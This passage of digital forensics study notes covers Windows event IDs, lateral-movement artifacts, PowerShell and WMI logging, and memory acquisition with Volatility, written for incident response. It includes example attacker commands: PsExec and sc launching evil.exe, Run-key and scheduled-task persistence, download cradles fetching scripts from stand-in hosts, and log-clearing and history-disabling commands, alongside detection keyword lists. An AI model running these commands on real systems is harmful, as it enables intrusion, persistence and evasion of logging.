	- 4769: Service Ticket was requested (access to server resource)
	- 4771: Pre-authentication failed (failed logon)

- Anomaly: find places where authentication didnt happen on domain controller (local account)  

**Error Codes**
- 4771 - 4776/4625
	- 0x6 - 0xC0000064: Invalid Username
	- 0x7 - n/a: Requested server not found
	- 0xC - 0xC0000070: Logon from unauthorzed workstation
	- 0x12 - 0xC0000234: Account locked, disabled, or expired
	- 0x17 - 0xC0000071: Password expired
	- 0x18 - 0xC000006A: Password invalid
	- 0x25 - n/a: Clock skew between machines is too great

<br>

### Privileged Local Account Abuse - Pass the Hash

- Filter event logs for Event ID 4776 (exclude Domain Controllers)
- Identify any workstations with these events
- Note Source Workstation, if Source Workstation doesn't match source of log activity is taking place remotely
- Review events surrounding 4776
	- 4624 (succesful logon)
		- Type 3 often indicative of share mapping or exceuting code with PsExec
	- 4672 - Privelged logon
	- 5140 - File Share event

<br>

### Account and Group Enumeration

- Event ID 4798: A user's local group was enumerated
- Event ID 4799: A security-enabled local group membership was enumerated

**Notes**

- New events starting with Win10 and Server 2016
- Focus on the process being used
	- PowerShell
	- WMIC
	- Cmd
- Filter on sensitive groups, unusual accounts, and process information
- Allowlist common processes
	- mmc.exe
	- services.exe
	- taskhostw.exe
	- explorer.exe
	- VSSSVC.exe

**Common Attack Tools**

- PowerView (PowerSploit)
- PowerShell Empire
- DeathStar

**Log Attributes**

- Account Name: Account that performed enumeration
- Group Name: Group Enumerated
- Process Name: Process used for enumeration

<br>

### Event Log Analysis Tools

- [Event Log Explorer](https://eventlogxp.com/)
	- Color Codes by Event IDs
	- Open many logs simultaneously
	- Filtering
	- Log merging (aids correlation and search time)

- [EvtxEcmd](https://github.com/EricZimmerman/evtx)
	- Xpath filters
	- Output to CSV, XML, JSON
	- Extraction of "custom" fields
	- Log merging and normalization
	- Crowd-sourced event maps
	- Noise reduction
	- Extract from VSS and de-duplicate

<br>

### Lateral Movement - Network Shares

- Event Id 5140: Network share was accessed
- Event Id 5145: Share object accessed (detailed file share auditing)

**Notes**

- Log provides share name and IP address of remote machine making connection
- Account name and logon ID allow tracking of relevant account and other activities
- Requires object access auditing to be enabled
- Event IDs 5142-5144 track share creation, modification, and deletion
- Detailed file share auditing (5145) provides detail on individual files access (can be very noisy)

<br>

### Cobalt Strike Mapping Shares

- Share Name: ```\\*\ADMIN$```
	- Windows Folder
	- Originaly designed to push patches
- Source Address: 127.0.0.1 (localhost)
	- Normally see remote host
- Account Name: COMPUTERNAME$
	- Normally see non-computer account

<br>

- Share Name: ```\\*\IPC$```
	- Sets up initial SMB connection
	- Part of authentication
	- Can be seen as part of enumeration tools
- Source Address: Remote Host
- Account Name: non-computer account

**Notes**
- Usually contains a corresponding 4624 event with Type 3 logon

Mandiant stated 24% of malware families they observed were cobalt strike

<br>

### Lateral Movement - Explicit Credentials - runas

- Track credential chagne common during lateral movement
- Event Id: 4624 (Logon Type 9)
- Event Id: 4648 (Logon using explicit credentials)

**Notes**
- Changing credentials necessary to move from system to system
- Typically only admins and attacks juggle multiple credentials
- 4648 events log on the originating system and help to identify attacker lateral movement from that system
- Logged if explicit credentials are supplied (even if no account change)
- RDP connections using different credentials often log 4648 events on both systems

**Detection**
- Originating Host - Event Id 4648
	- Subject
		- Account Name: Intitial Account Name
	- Account Whose Credentials Were Used
		- Account Name: "run as" account name
	- Target Server
		- Target Server Name: Remote Target
- Target System - Event Id 5140
	- Account Name: Should match account name of "Account Whose Credentials Were Used" from orginating host 4648 log
	- Source Address: Source IP of originating host
	- Share Name: Share accessed (IPC$, etc)
	- Computer: Computer name of remote host

**Cobalt Strike - Make Token or Pass the hash**

- EventID 4624
	- Logon Type 9 (explicit credentials)
	- "Subject - Account Name" matches "New Logon - Account Name"
	- Note Process information

<br>

- EventId 4648 (explicit credentials)
	- "Subject - Account Name" mathces "Account Whose Credentials Were Used - Account Name"
	- Note Target Server Name

<br>

### Lateral Movement - Scheduled Tasks

- Log: Task Scheduler - Security
	- 106 - 4698 - Task Created
	- 140 - 4720 - Task Updated
	- 141 - 4699 - Task Deleted
- Task Scheduler
	- 200/201: Task Executed/Completed
- Security
	- 4700/4701: Task Enabled/Disabled

**Notes**
- Tasks can be executed locally and remotely
	- Remotely scheduled task also cause Logon (ID 4624) Type 3 events
- Attackers commonly delete scheduled tasks after execution
	- Hunt deleted tasks (rare)
- Tasks running executables from /Temp likey evil

**Task Scheduler Artifacts**
- XML Files
- Saved in:
	- \Windows\System32\Tasks
	- \Windows\SysWOW64\Tasks
- Includes:
	- Task Name
	- Registration date and time (local)
	- Account used to register
	- Trigger conditions and frequency
	- Full command path
	- Account authenticated to run task

<br>

### Suspicious Services

- Analyze logs for suspicious services running at boot time
	- Service type changed to Boot
- Review services started and stopped during time of a suspected hack

<br>

- System Log
	- 7034: Service Crashed Unexpectedly
	- 7035: Service sent a Start/Stop control
	- 7036: Service started or stopped
	- 7040: Start typed changed (Boot, On Request, Disabled)
	- 7045: A new service was installed on the system (Win2008R2+)
- Security Log
	- 4697: A new service was installed on the system

<br>

**Notes**
- A large amount of malware and worms in the wild utilize Services
- Services started on bot illustrate peristence
- Services can crash due to attacks like process injections

<br>

**Example - PsExec**
- Filter by 7045 (New service installed)
- Look for services not tied to Built-In accounts (SIDs)
- Everytime PsExec runs, it starts a brand new service
- Note service File Name

<br>

### Event Log Clearing
- 1102: Audit Log Cleared (Security)
- 104: Audit Log Cleared (System)

<br>

**Notes**
- Requires Admin Rights
- GUI and command-line clearing (i.e. wevutil) recorded 
- Note Account Name

**Event Log Attacks**
- Mimikatz ```event::drop```
- DanderSpritz ```eventlogedit```
- ```Invoke-Phantom``` thread killing
- Event Log service suspension; memory based attacks

<br>

**Mitigation**
- Event Log Forwarding
- Logging "heartbeat"
- Log gap analysis

<br>

## Lateral Movement Tactics

- [Hunt Evil](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Hunt_Evil_Poster.pdf)


### RDP - Source System Artifacts
- VNC
	- 4624 Type 2 (Console)
- TeamViewer
	- TeamViewerX_Logfile.log (X = TV Version) - Source
	- Connections_incoming.txt - Destination

**Event Logs**
- Security.evtx
	- 4648 - Logon specifying alternate credentials - if NLA enabled on destination
		- Current logged on username
		- Alternate username
		- Destination Hostname/IP
		- Process Name
- Microsoft-Windows-TerminalServices-RDPClient%4Operational.evtx
	- 1024
		- Destination Hostname
	- 1102
		- Destination IP address

<br>

**Registry**
- Remote Desktop Destinations are tracked per-user
	- ```NTUSER\Software\Microsoft\Terminal Server Client\Servers```
- ShimCache - SYSTEM
	- mstsc.exe Remote Desktop Client
- BAM/DAM - SYSTEM - Last Time Executed
	- mstsc.exe Remote Desktop Client
- Amcache.hve - First Time Executed
	- mstsc.exe
- UserAssist - NTUSER.DAT
	- mstsc.exe Remote Desktop Client execution
	- Last Time Executed
	- Number of Times Executed
- RecentApps - NTUSER.DAT
	- mstsc.exe Remote Desktop Client Execution
	- Last Time Executed
	- Number of Times Executed
	- RecentItems subkey tracks connection destination and times

<br>

**File System**
- Jumplists ```C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\```
	- {MSTSC-APPID}-automaticdestinations-ms
	- Tracks remote desktop connection destination and times
- Prefetch ```C:\Windows\Prefetch\```
	- mstsc.exe-{hash}.pf
- Bitmap Cache ```C:\Users\<username>\AppData\Local\Microsoft\Terminal Server Client\Cache```
	- bcache##.bmc
	- cache####.bin
	- [Bitmap Cache Parser](https://github.com/ANSSI-FR/bmc-tools)

<br>

### RDP - Destination System Artifacts

**Event Logs**
- Security Event Log – security.evtx
	- 4624 Logon Type 10
 		- Source IP/Logon User Name
	- 4778/4779
		- IP Address of Source/Source
		- System Name
 		- Logon User Name
- Microsoft-WindowsRemoteDesktopServicesRdpCoreTS%4Operational.evtx
	- 131 – Connection Attempts
 		- Source IP
 	- 98 – Successful Connections
- Microsoft-Windows-Terminal Services-RemoteConnection Manager%4Operational.evtx
	- 1149
		- Source IP/Logon User Name
 			- Blank user name may indicate use of Sticky Keys
- Microsoft-Windows-Terminal Services-LocalSession Manager%4Operational.evtx
	- 21, 22, 25
		- Source IP/Logon User Name
	- 41
 		- Logon User Name

<br>

**Registry**
- ShimCache – SYSTEM
	- rdpclip.exe
	- tstheme.exe
- AmCache.hve – First Time Executed
 - rdpclip.exe
 - tstheme.exe

<br>

**File System**
- Prefetch ```C:\Windows\Prefetch\```
 - ```rdpclip.exe-{hash}.pf```
 - ```tstheme.exe-{hash}.pf```

<br>

### Windows Admin Shares - Source System Artifacts
- C$
- ADMIN$
- IPC$

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name
- Microsoft-Windows-SmbClient%4Security.evtx
	- 31001 – Failed logon to destination
		- Destination Host Name
		- User Name for failed logon
		- Reason code for failed destination logon (e.g. bad password)

<br>

**Registry**
- MountPoints2 – Remotely mapped shares ```NTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2```
- Shellbags – USRCLASS.DAT
	- Remote folders accessed inside an interactive session via Explorer by attackers
- ShimCache – SYSTEM
	- net.exe
	- net1.exe
- BAM/DAM – NTUSER.DAT – Last Time Executed
	- net.exe
	- net1.exe
- AmCache.hve – First Time Executed
	- net.exe
	- net1.exe

	```net use z: \\host\c$ /user:domain\username <password>```

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```
	- ```net.exe-{hash}.pf```
	- ```net1.exe-{hash}.pf```
- User Profile Artifacts
	- Review shortcut files and jumplists for remote files accessed by attackers, if they had interactive access (RDP)

<br>

### Windows Admin Shares -  Destination System Artifacts
- Stage malware/access sensitive files
- Pass-the-Hash attacks common
- Vista+ requires domain or built-in admin rights

**Event Logs**
- Security Event Log – security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
- 4672
	- Logon User Name
	- Logon by user with administrative rights
	- Requirement for accessing default shares such as C$ and ADMIN$
- 4776 – NTLM if authenticating to Local System
	- Source Host Name/Logon User Name
- 4768 – TGT Granted
	- Source Host Name/Logon User Name
	- Available only on domain controller
- 4769 – Service Ticket Granted if authenticating to Domain Controller
	- Destination Host Name/Logon User Name
	- Source IP
	- Available only on domain controller
- 5140
	- Share Access
- 5145
	- Auditing of shared files – NOISY!

<br>

**File System**
- File Creation
	- Attacker's files (malware) copied to destination system
- Look for Modified Time before Creation Time
- Creation Time is time of file copy

<br>

### PsExec - Source System Artifacts

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name

<br>

**Registry**
- NTUSER.DAT
	- ```Software\SysInternals\PsExec\EulaAccepted```
- ShimCache – SYSTEM
	- psexec.exe
- BAM/DAM – SYSTEM – Last Time Executed
	- psexec.exe
- AmCache.hve – First Time Executed
	- psexec.exe

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\psexec.exe-{hash}.pf```
- Possible references to other files accessed by psexec.exe, such as executables copied to target system with the “-c” option
- File Creation
	- psexec.exe file downloaded and created on local host as the file is not native to Windows

```psexec.exe \\host -accepteula -d -c c:\temp\evil.exe```


<br>

### PsExec - Destination System Artifacts
- Authenticates to destination system
- Named pipes are used to communicate
- Mounts hidden ADMIN$ share
- Copies PsExec.exe and other binaries to windows folder
- Executes code via a service (PSEXESVC)

**Event Logs**
- security.evtx
	- 4648 Logon specifying alternate credentials
		- Connecting User Name
		- Process Name
- 4624 Logon Type 3 (and Type 2 if “-u” Alternate Credentials are used)
	- Source IP/Logon User Name
- 4672
	- Logon User Name
	- Logon by a user with administrative rights
	- Requirement for access default shares such as C$ and ADMIN$
- 5140 – Share Access
	- ADMIN$ share used by PsExec
- system.evtx
	- 7045
		- Service Install

<br>

**Registry**
- New service creation configured in ```SYSTEM\CurrentControlSet\Services\PSEXESVC```
	- “-r” option can allow attacker to rename service
- ShimCache – SYSTEM
	- psexesvc.exe
- AmCache.hve First Time Executed
	- psexesvc.exe

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
		- ```psexesvc.exe-{hash}.pf```  
		- ```evil.exe-{hash}.pf```  
- File Creation
	- User profile directory structure created unless “-e” option used
- psexesvc.exe will be placed in ADMIN$ (\Windows) by default, as well as other executables (evil.exe) pushed by PsExec

<br>

### Windows Remote Management Tools
- Create and Start a remote service  
	- ```sc \\host create servicename binpath= “c:\temp\evil.exe”```  
	- ```sc \\host start servicename```  
- Remotely schedule tasks  
	- ```at \\host 13:00 "c:\temp\evil.exe"```  
	- ```schtasks /CREATE /TN taskname /TR c:\temp\evil.exe /SC once /RU “SYSTEM” /ST 13:00 /S host /U username```  
- Interact with Remote Registries  
	- ```reg add \\host\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Data /t REG_SZ /d "C:\evil.exe"```  
- Execute any remote command  
	- ```winrs -r:host -u:user command```  

<br>

### Remote Services - Source System Artifacts

**Registry**
- ShimCache – SYSTEM
	- ```sc.exe```  
- BAM/DAM – SYSTEM – Last Time Executed
	- ```sc.exe```  
-	AmCache.hve – First Time Executed
	- ```sc.exe```  

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```sc.exe-{hash}.pf```  

<br>

### Remote Services - Destination System Artifacts

**Event Logs**
- security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
- 4697
	- Security records service install, if enabled
	- Enabling non-default Security events such as ID 4697 are particularly useful if only the Security logs are forwarded to a centralized log server
- system.evtx
	- 7034 – Service crashed unexpectedly
	- 7035 – Service sent a Start/Stop control
	- 7036 – Service started or stopped
	- 7040 – Start type changed _(Boot | On Request | Disabled)_
	- 7045 – A service was installed on the system

<br>

**Registry**
- ```SYSTEM\CurrentControlSet\Services\```
	- New service creation
- ShimCache – SYSTEM
	- evil.exe
	- ShimCache records existence of malicious service executable, unless implemented as a service DLL
- AmCache.hve – First Time Executed
	- evil.exe

<br>

**File System**
- File Creation
	- evil.exe or evil.dll malicious service executable or service DLL
- Prefetch – ```C:\Windows\Prefetch\```
	- ```evil.exe-{hash}.pf```


<br>

### Scheduled Tasks - Source System Artifacts

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name

<br>

**Registry**
-	ShimCache – SYSTEM
	- at.exe
	- schtasks.exe
-	BAM/DAM – SYSTEM – Last Time Executed
	- at.exe
	- schtasks.exe
- AmCache.hve -First Time Executed
	- at.exe
	- schtasks.exe

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```
	- ```at.exe-{hash}.pf```
	- ```schtasks.exe-{hash}.pf```

<br>

### Scheduled Tasks - Destination System Artifacts

**Event Logs**
- security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
	- 4672
		- Logon User Name
		- Logon by a user with administrative rights Requirement for accessing default shares such as C$ and ADMIN$
	- 4698 – Scheduled task created
	- 4702 – Scheduled task updated
	- 4699 – Scheduled task deleted
	- 4700/4701 – Scheduled task enabled/disabled
- Microsoft-Windows-Task Scheduler%4Operational.evtx
	- 106 – Scheduled task created
	- 140 – Scheduled task updated
	- 141 – Scheduled task deleted
	- 200/201 – Scheduled task

<br>

**Registry**
- SOFTWARE
	- ```Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks```  
	- ```Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\```  
- ShimCache – SYSTEM
	- evil.exe
- AmCache.hve – First Time Executed
	- evil.exe

<br>

**File System**
- File Creation
	- evil.exe
	- Job files created in ```C:\Windows\Tasks```  
	- XML task files created in ```C:\Windows\System32\Tasks```  
		- Author tag under "RegistrationInfo" can identify:
			- Source system name
			- Creator username
- Prefetch – ```C:\Windows\Prefetch\```  
	- evil.exe-{hash}.pf

<br>

### WMI - Source System Artifacts
- Powerful lateral movement options
- Native to Windows OS

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name

<br>

**Registry**
- ShimCache – SYSTEM
	- wmic.exe
- BAM/DAM – SYSTEM – Last Time Executed
	- wmic.exe
- AmCache.hve – First Time Executed
	- wmic.exe

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```wmic.exe-{hash}.pf```  

<br>

### WMI - Destination System Artifacts
- wmiprvse.exe
- Microsoft-Windows-WMI-Activity/Operational

**Event Logs**
- security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
- 4672
	- Logon User Name
	- Logon by an a user with administrative rights
- Microsoft-Windows-WMIActivity%4Operational.evtx
	- 5857
		- Indicates time of wmiprvse execution and path to provider DLL – attackers sometimes install malicious WMI provider DLLs
- 5860, 5861
	Registration of Temporary (5860) and Permanent (5861) Event Consumers. Typically used for persistence, but
can be used for remote execution.

<br>

**Registry**
- ShimCache – SYSTEM
	- scrcons.exe
	- mofcomp.exe
	- wmiprvse.exe
	- evil.exe
- AmCache.hve – First Time Executed
	- scrcons.exe
	- mofcomp.exe
	- wmiprvse.exe
	- evil.exe

<br>

**File System**
- File Creation
	- evil.exe
	- evil.mof – .mof files can be used to manage the WMI Repository
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```scrcons.exe-{hash}.pf```  
	- ```mofcomp.exe-{hash}.pf```  
	- ```wmiprvse.exe-{hash}.pf```  
	- ```evil.exe-{hash}.pf```  
- Unauthorized changes to the WMI Repository in ```C:\Windows\system32\wbem\Repository```  

<br>

### Powershell Remoting - Source Sytem Artifacts

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name
- Microsoft-Windows-WinRM%4Operational.evtx
	- 6 – WSMan Session initialize
		- Session created
		- Destination Host Name or IP
		- Current logged-on User Name
	- 8, 15, 16, 33 – WSMan Session deinitialization
		- Closing of WSMan session
		- Current logged-on User Name
- Microsoft-Windows-PowerShell%4Operational.evtx
	- 40961, 40962
		- Records the local initiation of powershell.exe and associated user account
	- 8193 & 8194
		- Session created
	- 8197 - Connect
		- Session closed

<br>

**Registry**
- ShimCache – SYSTEM
	- powershell.exe
- BAM/DAM – SYSTEM – Last Time Executed
	- powershell.exe
- AmCache.hve – First Time Executed
	- powershell.exe

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```powershell.exe-{hash}.pf```  
	- PowerShell scripts (.ps1 files) that run within 10 seconds of powershell.exe launching will be tracked in powershell.exe prefetch file
- Command history 
	- ```C:\USERS\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt```  
	- With PS v5+, a history file with previous 4096 commands is maintained per user

```
Enter-PSSession –ComputerName host
Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.exe}
```

<br>

### Powershell Remoting - Destination Sytem Artifacts
- Source Process: powershell.exe
- Destination Process: wsmprovhost.exe

**Event Logs**
- security.evtx
 	- 4624 Logon Type 3
 		- Source IP/Logon User Name
 - 4672
 	- Logon User Name
 	- Logon by an a user with administrative rights
- Microsoft-WindowsPowerShell%4Operational.evtx
	- 4103, 4104 – Script Block logging
 		- Logs suspicious scripts by default in PS v5
 		- Logs all scripts if configured
	- 53504 Records the authenticating user
- Windows PowerShell.evtx
	- 400/403 "ServerRemoteHost" indicates start/end of Remoting session
 	- 800 Includes partial script code
- Microsoft-WindowsWinRM%4Operational.evtx
	- 91 Session creation
	- 168 Records the authenticating user

<br>

**Registry**
- ShimCache – SYSTEM
	- wsmprovhost.exe
	- evil.exe
- SOFTWARE
	- ```Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\ExecutionPolicy```  
	- Attacker may change execution policy to a less restrictive setting, such as "bypass"
- AmCache.hve – First Time Executed
	- wsmprovhost.exe
 	- evil.exe

<br>

**File System**
- File Creation
	- evil.exe
	- With Enter-PSSession, a user profile directory may be created
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```evil.exe-{hash].pf```  
	- ```wsmprovhost.exe-{hash].pf```  

<br>

### Application Deployment Software
- Patch Management Tools
- Cloud Control Panels (Azure, AWS, Google Cloud, etc.)

<br>

### Vulnerability Exploitation
- Crash Detection
	- Crash Reports
	- Event logs
- Process Tracking
	- Event ID 4688 (New process creation)
		- IIS worker process spawning command shells
	- Process anomalies
	- Code injection
- Threat Intel
- AV/HIPS/Exploit Guard Logging

<br>

## Commandline, PowerShell and WMI Analysis

### Evidence of Malware Execution

- System Event Log
	- Review Critical, Warning, and Error events for system and process crashes
- Application Event Log
	- EID 1000-1002
		- Windows Error Reporting (WER), Application crashes and hangs

**Notes**
- Note Crashed Applications, processes, and system reboots
- Review Windows Error Reports (Report.WER) written during times of interest
	- ```C:\Program Data\Microsoft\Windows\WER```
	- ```%User Profile%\AppData\Local\Microsoft\Windows\WER```
	- Includes Loaded DLLs and SHA1 hash
	- [Using .WER files to hunt evil](https://medium.com/dfir-dudes/amcache-is-not-alone-using-wer-files-to-hunt-evil-86bdfdb216d7)
- Windows Defender and/or AV logs should also be reviewed

<br>

### Process Tracking and Capturing Command Lines
- cmd.exe and powershell.exe
- EID 4688: New Process Created (includes executable path)
- EID 4689: Process Exit

<br>

**Notes**
- Available in Windows 7+
- Records account used, process info, and full command line
- Command line capture requires Process Tracking to be enabled (not on by default)
- Logon ID value can be used to link processes to a user session
- Note Parent/Child Process relationships

<br>

### WMI
- Enterprise information mangement framework designed to allow access to system data at scale
- WMIC.exe

**Recon**
- ```wmic process get CSName,Description,ExecutablePath,ProcessId```
- ```wmic useraccount list full```
- ```wmic group list full```
- ```wmic netuse list full```
- ```wmic qfe get Caption,Description,HotFixID,InstalledOn```
- ```wmic startup get Caption,Command,Location,User```

**Privilege Escalation**
- ```Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}```
- ```Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | Where-Object {-not $_.pathname.StartsWith("`"")} | Where-Object {-not $_.pathname.StartsWith("'")} | Where-Object {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"```
- ```Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object {$Owners[$_.handle] = $_.getowner().user}```
- From [PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

**Lateral Movement**
- Process Call Create
- ```wmic.exe PROCESS CALL CREATE \"C:\\Windows\\System32\\rundll32.exe \\\"C:\\Windows\\perfc.dat\\\" #1```

**Event Logs**
- CommmandLine: ```C:\Windows\system32\wbem\wmic.exe" process call create "c:\Windows\system32\wscript.exe C:\egxifm\lkhqhtnbrvyo.vbs"```
- ImageFileName: ```\Device\HarddiskVolume1\Windows\SysWOW64\wbem\WMIC.exe```
- Event Logs (EID 4688)
- Microsoft Sysmon
- Commercial EDR Tools

<br>

### Auditing WMI Peristence
- Easily audit for malicious WMI event consumer
- EID 5858 records query errors, including host and username
- EID 5857-5861 record filter/consumer
- EID 5861 is the most useful: new permanent event consumer creation

**Notes**
- WMI-Activity/Operational Log
- Enabled by default on Win10 and Win2012R2+
- Event Filter and Consumer recorded in logs
- Both CommandLineEvent and ActiveScriptEvent consumers are logged

<br>

### Quick Wins - WMI-Activity/Operational Log
- EID 5861: New permanent consumers
- Create an WMI consumer allowlist
- WMIC commandlines in Process Tracking (Security Logs)
- EID 5857 tracks loaded provider dlls
- EID 5858 includes hostname and username
- Search for:
	- CommandLine
	- ActiveScript
	- scrcons
	- wbemcons
	- powershell
	- eval
	- .vbs
	- .ps1
	- ActiveXObject

<br>

### PowerShell Logging
- EID 4103: Module logging and pipeline output
- EID 4104: Script block logging
- EID 4105/4106: Script Start/Stop (not recommended)

**Notes**
- Powershell/Operational
	- Powershell downgrade attacks can circumvent logging and security by running ```powershell -Version 2 -Command <..>```
- Script block logging includes scripts and some deobfuscation
	- Script block: a collection of code that accomplishes a task
- Windows Powershell.evtx is older but still useful (EID 400/800)
- WinRM/Operational logs records inbound and outbound PowerShell Remoting
	- Destination Hostname, IP, Logged On user (EID 6)
	- Source of session creation (EID 91)
	- Authenticating user account (EID 168)

**Enable PowerShell Logging**
- GPO - "Turn on Powershell Script Block Logging"
- Suspicious scripts = "Warning" events

**PowerShell Stealth Syntax**
```powershell
powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient.downloadstring('http://example.com/a'))
```
- -W: WindowStyle (often "hidden")
- -nop: NoProfile
- -noni: NonInteractive 
- -ec: EncodedCommand
- -exec: Execution Policy (often "bypass")
- IEX: Invoke-Expression (execute arbitrary commands, rarely used)
- (New-ObjectSystem.Net.WebClient).DownloadFile()
- Start-BitsTransfer
- Invoke-WebRequest

<br>

### Quick Wins - PowerShell
- PowerShell/Operational Log
	- EID 4103 records module/pipeline output
	- EID 4104 record code (scripts) executed (look for "Warning" events)
- PowerShell download cradle heavily used in the wild
	- ```IEX (New-Object Net.WebClient).dowloadstring("http://bad.com/bad.ps1")```
- Filter using commonly abused keywords
	- download
	- IEX
	- rundll32
	- http
	- Start-Process
	- Invoke-Expression
	- Invoke-Command
	- syswow64
	- FromBase64String
	- WebClient
	- bitstransfer
	- Reflection
	- powershell -version
	- Invoke-WmiMethod
	- Invoke-CimMethos
- Look for encoding and obfuscation
	- Character frequency analysis [Revoke-Obfuscation](https://github.com/danielbohannon/Revoke-Obfuscation)
	- [CyberChef](https://github.com/gchq/CyberChef)
	- [PSDecode](https://github.com/R3MRUM/PSDecode)
	- [Finding Encoded PS Scripts](https://www.youtube.com/watch?v=JWC7fzhvAY8
)

<br>

### PowerShell Transcript Logs
- Records input/output to the powershell terminal
- Not enabled by default (available in PS v4)
- Written to ```\Users\<account>\Documents```
- Can be auto forwarded
- GPO: Computer Configuration/Administrative Templates/Windows Components/Windows Powershell/Turn on Powershell Transcription

### PSReadline
- ```ConsoleHost_history.txt```
- ```%UserProfile%\Roaming\Microsoft\Windows\PowerShell\PSReadline```
- Records last 4096 commands typed in PS console (not ISE)
- Enabled by default in Win10/PowerShell v5
- Attackers can disable (or Remove PsReadLine module)
	- ```Set-PSReadLineOption -HistorySaveStyle SaveNothing```
	- ```Remove-Module -Name PsReadline```

<br>

---

<br>

# Memory Forensics

**Capabilities**
- Archival of commandline data per process
- Recording of host-based netowrk activity, including local DNS cache, sockets, ARP, etc
- Tracking of new process handles and execution tracing
- Analyzing suspicious thread creation and memory allocation
- Identification of common DLL injection and hooking (rootkit) tehcniques

<br>

## Acquiring Memory

### Live System
- [WinPMEM](https://github.com/Velocidex/c-aff4)
- DumpIt
- F-Response and SANS SIFT
- [Belkasoft Live RAM Capturer](https://belkasoft.com/ram-capturer)
- [MagnetForensics Ram Capture](https://www.magnetforensics.com/resources/magnet-ram-capture/)

<br>

### Dead System

**Hibernation File**
- Contains a compressed RAM Image
- When PC goes into power save or hibernation mode from sleep mode
- ```%SystemDrive%\hiberfil.sys```

<br>

**Page and Swap Files**
- ```%SystemDrive%\pagefile.sys```  
- Parts of memory that were paged out to disk
- ```%SystemDrive%\swapfile.sys``` (Win8+\2012+)
- The working set of memory for suspended Modern apps that have been swapped to disk

<br>

**Memory Dump**
- ```%WINDIR%\MEMORY.DMP```
- Crash dump

### Hiberfil.sys
**Tools can decompress to raw**
- Volatility *imagecopy*
- Comae *hibr2bin.exe*
- Arsenal *Hibernation Recon*

**Tools that can analyze natively**
- BulkExtractor
- Magnet AXIOM
- Volatility
- Passware

### Virtual Machine Machines

**VMware**
- .vmem = raw memory 
- .vmss and .vmsn = memory image
- Suspend or Snapshot VM

<br>

**Microsoft Hyper-V**
- .bin = memory image
- .vsv = save state

<br>

**Parallels**
- .mem = raw memory image

<br>

**VirtualBox**
- .sav = partial memory image

<br>

## Memory Forensic Process
1. Collect Data for Analysis
	- Capture Raw Memory
	- Hibernation File
2. Put the Collected Into Context
	- Establish Context
		- Understand the disk, partitions, file system format
	- Find Key Memory Offsets
3. Analyze Results to Understand Meaning and Identify Important Elemets
	- Analyze Data for Significant Elements
	- Recover Evidence

<br>

## Memory Analysis
1. Identify Context
	- Find the Kernel Processor Control Region (KPCR), Kernel Debugger Data Block (KDGB), and/or Directory Table Base (DTB)
2. Parse Memory Structures
	- Executive Process (EPROCESS) blocks
		- All running proccess
	- Process Environment (PEB) blocks
		- Full commandlines (including arguements)
		- DLLs loaded
	- Virtual Address Descriptors (VAD) Tree
		- List of memory sections belonging to the process
		- Identify everthing that belongs to the process
		- (i.e. Dump entire powershell process to identify scripts)
	- Kernel Modules/Drivers
3. Scan for Outliers
	- Unlinked processes, DLLs, sockets, and threads (run code)
	- Unmapped memory pages with executive privilges
	- Hook detection
	- Known heuristics and signatures
4. Analysis: Search for Anomalies

<br>

<img alt="Micosoft's Attack Lifecycle" src="https://raw.githubusercontent.com/w00d33/w00d33.github.io/main/_files/KDGB_flow.PNG" />

<br>

## Volatility
- [Volatility](https://code.google.com/archive/p/volatility/)
- [Command Wiki](https://code.google.com/archive/p/volatility/wikis/CommandReference23.wiki)

<br>

**Basic Command Structure**

```vol.py -f [image] --profile=[profile] [plugin]```

<br>

**Using Volatility**

```vol.py -f memory.img --profile=Win10x64_19041 pslist```

- Set an environment variable to replace -f image
	- ```export VOLATILITY_LOCATION=file://<file path>```  

- Remove environment variables
	- ```unset VOLATILITY_LOCATION```  

- Volatility plug in location (SIFT)
	- ```/usr/local/src/Volatility/volatility/plugins/```  

- Get help (-h or --info)
	- ```vol.py malfind -h```
	- ```--info``` to see profiles and registered objects
	- [Command Info](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference) 

<br>

**Volatility Profiles**
